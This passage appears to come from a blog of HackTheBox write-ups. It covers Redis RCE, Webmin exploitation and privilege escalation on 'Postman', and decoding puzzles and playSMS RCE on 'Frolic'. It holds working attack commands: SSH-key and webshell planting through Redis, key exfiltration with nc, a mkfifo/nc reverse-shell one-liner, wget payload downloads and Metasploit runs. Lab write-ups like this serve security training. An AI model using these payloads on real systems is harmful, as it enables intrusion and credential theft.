4.0.9 Exploit Title Path Redis - Replication Code Execution (Metasploit) linux/remote/48272.rb Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit) linux/remote/47195.rb Redis Remote Command Execution (SSH) https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html Redis Remote Code Execution https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce Tried the 2 metasploit exploits, both failed Instead I refered to hacktricks - Pentesting Redis, there is an entire section on how to do RCE. Redis RCE via PHP Webshell - Failed, insufficient permissions to write to /var/www/html/ Redis RCE via SSH - Works! Why is redis vulnerable to this? 99.99% of the Redis use cases are inside a sandboxed environment. Security is complex. Adding security features adds complexity. Complexity for 0.01% of use cases is not great, but it is a matter of design philosophy, so you may disagree of course. - Source Redis should only be accessed by authorized clients and there should be fire walling, authentication should be enabled and, binding it to 127.0.0.1. Try Redis RCE via SSH Find out the home directory of the redis user 10.10.10.160:6379&amp;gt; config get dir 1) &quot;dir&quot; 2) &quot;/var/lib/redis&quot; 10.10.10.160:6379&amp;gt; /var/lib/redis Create SSH key-pair ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# ssh-keygen -t rsa -C &quot;crack@redis.io&quot; Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:lNzv29nGWGzcI4CzBj/TXSuaTJ4oZBFrJ6//P+3nrBs crack@redis.io The key&#39;s randomart image is: +---[RSA 3072]----+ | | | o o | | * o | | B + o . | | . S + + .oo| | o B + + o*| | o o B = E=.| | o . * +.*+| | o...o.B*=| +----[SHA256]-----+ Create id_rsa.pub w/ padding - this is to ensure that the key remains valid ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# (echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &amp;gt; foo.txt Remove all keys in database ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# redis-cli -h 10.10.10.160 flushall OK Save created public key to user redis’s authorized_keys file ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit OK ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# redis-cli -h 10.10.10.160 10.10.10.160:6379&amp;gt; config set dir /var/lib/redis/.ssh/ OK 10.10.10.160:6379&amp;gt; config set dbfilename &quot;authorized_keys&quot; OK 10.10.10.160:6379&amp;gt; save OK 10.10.10.160:6379&amp;gt; SSH w/ redis -i id_rsa ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# ssh -i id_rsa redis@postman.htb Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1 redis@Postman:~$ Demo - redis RCE via SSH Privilege EscalationMatt - Enumeration (Found SSH Private Key) Found matt’s SSH private key w/ linpeas.sh Transfer id_rsa to kali ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# nc -nvlp 4444 &amp;gt; matt_id_rsa Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.160. Ncat: Connection from 10.10.10.160:53146. redis@Postman:/tmp$ nc 10.10.14.14 4444 &amp;lt; /opt/id_rsa.bak Matt - Crack SSH Private Key &amp;amp; SSH Convert it to john format w/ ssh2john.py ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# python ssh2john.py matt_id_rsa &amp;gt; john_matt_id_rsa Crack hash ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# john john_matt_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes Cost 2 (iteration count) is 2 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status computer2008 (matt_id_rsa) 1g 0:00:00:00 DONE (2022-09-21 23:16) 4.000g/s 987264p/s 987264c/s 987264C/s comunista..comett Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. SSH - Failed ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# ssh Matt@postman.htb -i matt_id_rsa Enter passphrase for key &#39;matt_id_rsa&#39;: Connection closed by 10.10.10.160 port 22 Connection closed immediately Instead, simply su to Matt w/ computer2008 redis@Postman:/home/Matt$ su Matt Password: computer2008 Matt@Postman:~$ Root - Enumeration Found some information from .bash_history Based on the history, user Matt is used to create user redis &amp;amp; some configurations in root. Successfully login w/ Matt:computer2008 on TCP/10000 (MiniServ 1.910)Root - Webmin/MiniServ 1.910 Authenticated RCE How does Webmin 1.910 - Remote Code Execution Using Python Script work? There is a RCE vulnerability residing in MiniServ’s Package Updates module, An authenticated remote attacker can exploit this if they are authorized to the Package Update module via the data parameter update.cgi to execute code w/ root privileges. Try Webmin 1.910 - Remote Code Execution Using Python Script Start netcat listener ┌──(root💀kali)-[~/htb/postman] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Exploit! ┌──(webmin-1.9)(root💀kali)-[~/htb/postman/10.10.10.160/exploit/webmin-1.9] └─# python2 webmin_exploit.py -s true --rhost postman.htb --rport 10000 --lhost 10.10.14.14 --lport 4444 -u Matt -p computer2008 -t / ********************Webmin 1.910 Exploit By roughiz******************** ********************Retrieve Cookies sid******************************* ********** [+] [Exploit] The Cookie is 748f1ae3b99cbab5753e2387d9f596c7 ****************** Create payload and Exploit ****************** ┌──(root💀kali)-[~/htb/postman] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.160. Ncat: Connection from 10.10.10.160:53152. id;whoami uid=0(root) gid=0(root) groups=0(root) root Demo - MiniServ/Webmin 1.91 Authenticated RCE Root - Webmin/MiniServ 1.910 Authenticated RCE (Metasploit) Launch msfconsole Set OPTIONS msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; set PASSWORD computer2008 PASSWORD =&amp;gt; computer2008 msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; set RHOSTS postman.htb RHOSTS =&amp;gt; postman.htb msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; set SSL true [!] Changing the SSL option&#39;s value may require changing RPORT! SSL =&amp;gt; true msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; set USERNAME Matt USERNAME =&amp;gt; Matt msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.14 View OPTIONS Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD computer2008 yes Webmin Password Proxies http:127.0.0.1:8080 no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 10000 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME Matt yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.14 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin &amp;lt;= 1.910 Exploit! msf6 exploit(linux/http/webmin_packageup_rce) &amp;gt; exploit [*] Started reverse TCP handler on 10.10.14.14:4444 [+] Session cookie: 901cb0ecb0496363e8b1a5d1405c87b2 [*] Attempting to execute the payload... [*] Command shell session 4 opened (10.10.14.14:4444 -&amp;gt; 10.10.10.160:53168 ) at 2022-09-22 01:14:03 +0800 shell [*] Trying to find binary &#39;python&#39; on the target machine [*] Found python at /usr/bin/python [*] Using `python` to pop up an interactive shell [*] Trying to find binary &#39;bash&#39; on the target machine [*] Found bash at /bin/bash id uid=0(root) gid=0(root) groups=0(root) root@Postman:/usr/share/webmin/package-upda AdditionalTCP/6379 (Redis key-value store 4.0.9) - Configuring RCE via Webshell to work View permissions of /var/www/html root@Postman:/var/www# ls -la total 20 drwxr-xr-x 3 root root 4096 Aug 25 2019 . drwxr-xr-x 13 root root 4096 Aug 25 2019 .. drwxr-xr-x 7 root root 4096 Aug 26 2019 html Allow redis user to write root@Postman:/var/www# chown redis:redis html/ root@Postman:/var/www# ls -la total 20 drwxr-xr-x 3 root root 4096 Aug 25 2019 . drwxr-xr-x 13 root root 4096 Aug 25 2019 .. drwxr-xr-x 7 redis redis 4096 Aug 26 2019 html The file that is written through our commands in redis-cli is rw-rw----, since the webserver (apache2) is running as www-data, if www-data tries to read the webshell, it does not work. We have to make apache2 run as user redis, we can do by changing User and Group in apache2 configuration file root@Postman:/var/www/html# nano /etc/apache2/apache2.conf # These need to be set in /etc/apache2/envvars User redis Group redis Restart apache2 root@Postman:/var/www/html# sudo service apache2 restart apache2 is now running as user redis root@Postman:/var/www/html# ps aux | grep apache2 root 32555 0.0 1.7 331332 16528 ? Ss 19:24 0:00 /usr/sbin/apache2 -k start redis 32556 0.0 0.9 335744 9116 ? S 19:24 0:00 /usr/sbin/apache2 -k start redis 32557 0.0 0.9 335744 9116 ? S 19:24 0:00 /usr/sbin/apache2 -k start redis 32558 0.0 0.9 335744 9116 ? S 19:24 0:00 /usr/sbin/apache2 -k start redis 32559 0.0 0.9 335744 9116 ? S 19:24 0:00 /usr/sbin/apache2 -k start redis 32560 0.0 0.9 335744 9116 ? S 19:24 0:00 /usr/sbin/apache2 -k start TCP/6379 (Redis key-value store 4.0.9) - RCE via Webshell Try Redis RCE via Webshell Create webshell ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# echo &quot;&amp;lt;?php system($_GET[&#39;c&#39;]);?&amp;gt;&quot; &amp;gt; webshell.txt Create webshell payload w/ padding (echo -e &quot;\\n\\n&quot;; cat webshell.txt; echo -e &quot;\\n\\n&quot;) &amp;gt; padded_webshell.txt Remove all keys in database ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit] └─# redis-cli -h 10.10.10.160 flushall OK Insert webshell onto /var/www/html ┌──(root💀kali)-[~/htb/postman] └─# redis-cli -h postman.htb postman.htb:6379&amp;gt; config set dir /var/www/html/ OK postman.htb:6379&amp;gt; config set dbfilename redis.php OK postman.htb:6379&amp;gt; set test &quot;&amp;lt;?php system($_GET[&#39;c&#39;]);?&amp;gt;&quot; OK postman.htb:6379&amp;gt; save OK postman.htb:6379&amp;gt; Test our Webshell ┌──(root💀kali)-[~/htb/postman] └─# curl &#39;http://postman.htb/webshell.php?c=id;whoami&#39; --output - REDIS0008 redis-ver4.0.9 redis-bits@ctime&amp;lt;[+used-mem¨ aof-preamblecrackit&quot; uid=107(redis) gid=114(redis) groups=114(redis) redis }Es9; Tried all sorts of reverse shell payloads, did not work. Instead download php-reverse-shell.php onto postman.htb # Payload wget+-O+/tmp/shell.php+10.10.14.14/php-reverse-shell.php ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell] └─# curl &#39;http://postman.htb/webshell.php?c=wget+-O+/tmp/shell.php+10.10.14.14/php-reverse-shell.php&#39; --output - REDIS0008 redis-ver4.0.9 redis-bits@ctime&amp;lt;[+used-mem¨ ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.160 - - [22/Sep/2022 02:47:27] &quot;GET /php-reverse-shell.php HTTP/1.1&quot; 200 - Invoke php-reverse-shell.php ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell] └─# curl &#39;http://postman.htb/webshell.php?c=php+/tmp/shell.php&#39; --output - Demo - redis RCE via Webshell " }, { "title": "HackTheBox - Frolic", "url": "/posts/Frolic/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "bof/linux-bof, cryptography, tcp/80-http/web-app-cms-exploit", "date": "2022-09-21 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed.Directory /admin contains a login page that is coded w/ javascript, viewing the source code reveals credentials. After successfully logging in, we are redirected to success.html, containing a ciphertext. It can be decrypted w/ a encryption called OOK!, revealing another directory /asdiSIAJJ0QWE9JAS.Directory /asdiSIAJJ0QWE9JAS contains a ciphertext. It can be decrypted w/ base64, revealing an zip file w/ password as its password. Unzipping it reveals another ciphertext that can be decrypted after hex decode -&amp;gt; base64 decode -&amp;gt; unbrainfuck, revealing a password idkwhatispass.Directory /dev, after directory enumerating it, reveals a directory /backup that reveals another directory playSMS. w/ the credentials obtained from earlier, we are able to login. playSMS is vulnerable to a RCE exploit, due to improper file contents handling in import.php, attackers can upload .csv file w/ a webshell, allowing us to obtain a low-privilege/www-data user.For the privilege escalation part, after enumerating the system, there is a binary w/ SUID bit set. It is susceptible to a bufferoverflow exploit due to using strcpy. By doing a ret2libc attack, we are able to privilege escalate to root.If you wish to practice Linux Buffer Overflow try HackTheBox Node Vulnhub Tr0ll 2 Overthewire Narnia 2,3,4 Column Details Box Name Frolic IP 10.10.10.111 Points 20 Difficulty Easy Creator felamos Release Date 13 Oct 2018 ReconTCP/1880 (HTTP) FFUF favicon.ico [Status: 200, Size: 16958, Words: 5, Lines: 5, Duration: 44ms] flows [Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 47ms] icons [Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 40ms] red [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 40ms] settings [Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 41ms] vendor [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 38ms] :: Progress: [4615/4615] :: Job [1/1] :: 972 req/sec :: Duration: [0:00:05] :: Errors: 0 :: flows red settings vendor TCP/9999 (HTTP) FFUF admin [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 40ms] backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 45ms] dev [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 36ms] test [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 42ms] :: Progress: [4615/4615] :: Job [1/1] :: 1066 req/sec :: Duration: [0:00:04] :: Errors: 0 :: admin backup dev test TCP/139,445 (SMB) SMBMAP ┌──(root💀kali)-[~/htb/frolic] └─# smbmap -H frolic.htb [+] Guest session IP: frolic.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) Initial Foothold - 1TCP/1880 (HTTP) - Node-Red Login Page Found a Node-RED login page at http://frolic.htb:1880/ Could not find any exploits from searchsploitTCP/9999 (HTTP) - /test, playSMS Login Page Directory enumerate http://frolic.htb/dev/FUZZ backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 45ms] test [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 37ms] View enumerated files/directories ┌──(root💀kali)-[~/htb/frolic] └─# curl http://frolic.htb:9999/dev/backup/ /playsms ┌──(root💀kali)-[~/htb/frolic] └─# curl http://frolic.htb:9999/dev/test test Found a login page at http://frolic.htb/playsms TCP/9999 (HTTP) - /backup, Found credentials View http://frolic.htb:9999/backup ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup]└─# curl http://frolic.htb:9999/backup/password.txtuser.txtloop/ Download the files ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup] └─# wget http://frolic.htb:9999/backup/user.txt ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup] └─# wget http://frolic.htb:9999/backup/password.txt ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup] └─# cat *.txt password - imnothuman user - admin admin:imnothuman Directory enumerate loop/ - Nothing interesting foundTCP/9999 (HTTP) - /admin, A vulnerable login page + Decrypt Ciphertext Found a login page at http://frolic.htb:9999/admin There are a few vulnerabilities on login page at http://frolic.htb:9999/admin, The source code of the login page (login.js) is exposed. The login page is loading a javascript login.js that checks whether the fields in form submitted is valid. The credentials are hardcoded View login.js var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;amp;&amp;amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } admin:superduperlooperpassword_lol Redirected to http://frolic.htb:9999/success.html, contains an unknown text ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot] └─# curl http://frolic.htb:9999/admin/success.html ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Identify the ciphertext w/ dcode Ook! - A rewriting of brainfuck, designed to be readable by orangutans Decrypt it /asdiSIAJJ0QWE9JAS TCP/9999 (HTTP) - /asdiSIAJJ0QWE9JAS, Ciphertext found + Decrypt Ciphertext Found another ciphertext at http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/ ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# curl http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA base64 Base64 decode it, ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# cat index.html | base64 -d &amp;gt; file Find out what type of file it is ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# cat index.html | base64 -d &amp;gt; file ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# file file file: Zip archive data, at least v2.0 to extract, compression method=deflate zip archive Crack the archive w/ fcrackzip ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file found file &#39;index.php&#39;, (size cp/uc 176/ 617, flags 9, chk 89c3) PASSWORD FOUND!!!!: pw == password password Extract the archive ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# unzip -P password file Archive: file inflating: index.php File index.php contains another ciphertext ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# cat index.php 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a hex Convert hex to ascii and then base64 decode it ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd] └─# cat index.php | xxd -r -p | base64 -d | tee brainfuck.txt base64: invalid input +++++ +++++ [-&amp;gt;++ +++++ +++&amp;lt;] &amp;gt;++++ +.--- --.++ +++++ .&amp;lt;+ brainfuck Decrypt brainfuck encoded text I was stuck for awhile until I realised that base64 did not completely decode everything because it errored out. Use an online base64 decoder Decrypt brainfuck encoded text idkwhatispass TCP/9999 (HTTP) - playSMS import.php RCE (Manual) Successfully login w/ admin:idkwhatispass at /playsms Unable to find the version of playSMS, we will have to try the exploits 1 by 1. Search exploits for playSMS Exploit Title Path PlaySMS - ‘import.php’ (Authenticated) CSV File Upload Code Execution (Metasploit) php/remote/44598.rb PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit) php/remote/48335.rb PlaySms 0.7 - SQL Injection linux/remote/404.pl PlaySms 0.9.3 - Multiple Local/Remote File Inclusions php/webapps/7687.txt PlaySms 0.9.5.2 - Remote File Inclusion php/webapps/17792.txt PlaySMS 1.4 - ‘/sendfromfile.php’ Remote Code Execution / Unrestricted File Upload php/webapps/42003.txt PlaySMS 1.4 - ‘import.php’ Remote Code Execution php/webapps/42044.txt PlaySMS 1.4 - ‘sendfromfile.php?Filename’ (Authenticated) ‘Code Execution (Metasploit) php/remote/44599.rb PlaySMS 1.4 - Remote Code Execution php/webapps/42038.txt PlaySMS 1.4.3 - Template Injection / Remote Code Execution php/webapps/48199.txt Tried PlaySMS 1.4 - &#39;/sendfromfile.php&#39; Remote Code Execution / Unrestricted File Upload (php/webapps/42003.txt), but it doesn’t work, I think it is patched. How does PlaySMS 1.4 - &#39;import.php&#39; Remote Code Execution (php/webapps/42044.txt) work? Due to improper file contents handling in import.php, authenticated users are able to upload a .csv file containing a webshell, and can execute any code by modifying the User-Agent field to the code they want to execute. Try PlaySMS 1.4 - &#39;import.php&#39; Remote Code Execution (php/webapps/42044.txt) Create the malicious .csv file # Payload &amp;lt;?php $t=$_SERVER[&#39;HTTP_USER_AGENT&#39;]; system($t); ?&amp;gt; Proceed to http://frolic.htb:9999/playsms/index.php?app=main&amp;amp;inc=feature_phonebook&amp;amp;route=import&amp;amp;op=list Change User-Agent w/ burp or hackbar # Steps Load URL -&amp;gt; Edit User-Agent Field -&amp;gt; Execute # Payload id;whoami Upload exploit.csv, we have RCE Start netcat listener ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell # Steps Load URL -&amp;gt; Edit User-Agent Field -&amp;gt; Execute # Payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.14 4444 &amp;gt;/tmp/f www-data shell obtained ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.111. Ncat: Connection from 10.10.10.111:38270. /bin/sh: 0: can&#39;t access tty; job control turned off $ id;whoami uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data $ cd /home/ayush $ wc -c user.txt 33 user.txt Demo - playSMS import.php RCE TCP/9999 (HTTP) - playSMS RCE (Metasploit) Launch msfconsole Search for UnrealIRCd and use exploit/unix/irc/unreal_ircd_3281_backdoor msf6 &amp;gt; use 0 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &amp;gt; Set OPTIONS msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set PASSWORD idkwhatispass PASSWORD =&amp;gt; idkwhatispass msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set RHOSTS frolic.htb RHOSTS =&amp;gt; frolic.htb msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set RPORT 9999 RPORT =&amp;gt; 9999 msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set TARGETURI /playsms TARGETURI =&amp;gt; /playsms msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set LHOST tun0 LHOST =&amp;gt; 10.10.14.14 msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; show options msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; set payload payload/php/meterpreter/reverse_tcp payload =&amp;gt; php/meterpreter/reverse_tcp View OPTIONS msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS frolic.htb yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.14 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 Exploit! msf6 exploit(multi/http/playsms_uploadcsv_exec) &amp;gt; exploit [*] Started reverse TCP handler on 10.10.14.14:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (39282 bytes) to 10.10.10.111 [*] Meterpreter session 7 opened (10.10.14.14:4444 -&amp;gt; 10.10.10.111:38334 ) at 2022-09-21 03:44:10 +0800 meterpreter &amp;gt; shell Process 3445 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) Initial Foothold - 2 (Unintended Path)TCP/9999 (HTTP) - Unauthenticated playSMS Template Injection + RCE (Manual) This exploit came out much later (2020-02-05), and it works unauthenticated. How does PlaySMS 1.4.3 - Template Injection / Remote Code Execution (php/webapps/48199.txt) work? This issue is caused by double processing a server-side template with a custom PHP template system called ‘TPL’ which is used in the PlaySMS template engine at src/Playsms/Tpl.php:_compile(). The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution. - Source Try PlaySMS 1.4.3 - Template Injection / Remote Code Execution (php/webapps/48199.txt) Execute the command in between braces and backticks at the username field # Payload {{`id;whoami`}} Tried to execute a reverse shell, failed Download php-reverse-shell onto frolic.htb # Payload {{`wget -O /tmp/shell.php 10.10.14.14/php-reverse-shell.php`}} ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.111 - - [21/Sep/2022 04:36:10] &quot;GET /php-reverse-shell.php HTTP/1.1&quot; 200 - Start netcat listener ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/exploit] └─# nc -nvlp 4444 Ncat: Version 7.92 ( 